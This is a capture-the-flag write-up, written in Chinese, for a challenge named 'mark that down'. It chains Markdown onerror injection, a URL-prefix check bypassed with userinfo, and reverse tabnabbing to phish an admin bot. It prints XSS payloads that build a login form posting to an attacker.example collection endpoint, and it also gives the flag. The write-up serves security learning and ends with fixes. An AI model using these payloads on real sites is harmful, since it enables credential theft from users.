# mark that down

## 题目简述

站点允许生成 Markdown 页面，并让管理员机器人访问被举报的 URL。利用链由三处缺陷组成：Markdown 图片属性可注入 `onerror`、举报地址只用 `startsWith` 校验、机器人以保留 `opener` 的 `window.open` 打开页面，最终形成反向标签劫持与凭据钓鱼。

## 解题过程

Showdown 会把下列 Markdown 转成带事件属性的图片，而过滤器只拒绝 `<`、`>` 和 `;`：

```markdown
![]("onerror="f=document.createElement('form'))
![]("onerror="(f.action='https://attacker.example/collect'))
![]("onerror="document.body.appendChild(f))
```

继续用多张图片的 `onerror` 分步创建 `username`、`password` 输入框和提交按钮，生成一个外观可控、提交到攻击者服务器的登录表单。

举报检查只验证字符串是否以比赛站点 URL 开头，可以把比赛主机写进 URL 的用户信息部分：

```text
http://challenge.example@attacker.example/
```

机器人在已打开真实登录页的标签中执行 `window.open(url, '_blank')`。攻击者页面通过 `window.opener.location` 把原标签导航到刚才生成的钓鱼页面；机器人随后关闭新标签、回到原标签并重新加载，再自动输入管理员账号和随机密码。由于当前位置已被替换，凭据会提交给攻击者。使用窃取的凭据登录 `/admin`，得到：

```text
n00bz{r3v3rs3_t4bn4bb1ng_1s_ju5t_lurk1ng_4r0und..}
```

## 方法总结

这不是单点 XSS，而是一条浏览器状态利用链。URL 校验应解析并比较规范化后的 `origin`，外部页面应使用 `noopener` 打开，机器人也不应在可被导航的页面中继续填写敏感凭据。
